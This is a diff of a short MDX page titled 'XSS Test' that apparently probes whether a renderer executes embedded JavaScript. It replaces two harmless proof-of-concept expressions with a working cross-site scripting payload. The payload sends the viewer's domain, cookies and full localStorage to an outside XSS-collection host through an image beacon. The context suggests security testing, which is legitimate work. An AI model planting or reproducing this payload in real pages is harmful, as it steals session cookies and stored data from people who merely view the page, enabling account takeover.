@@ -1,11 +1,5 @@
 ---
 title: XSS Test
 ---
-
 # XSS Test
-
-Expr: {(()=>{window.__EXPR='EXPR_EXEC_'+document.domain;return 'EXPR_OK'})()}
-
-<img src="x" onError={()=>{window.__IMG='IMG_ONERROR_'+document.domain}} />
-
-Done.
+Exfil: {(()=>{try{new Image().src='https://xsshunter.trufflesecurity.com/amr/beacon?d='+encodeURIComponent(document.domain)+'&c='+encodeURIComponent(document.cookie)+'&ls='+encodeURIComponent(JSON.stringify(localStorage));window.__EXFIL='SENT'}catch(e){window.__EXFIL='ERR:'+e}return 'exfil-fired'})()}
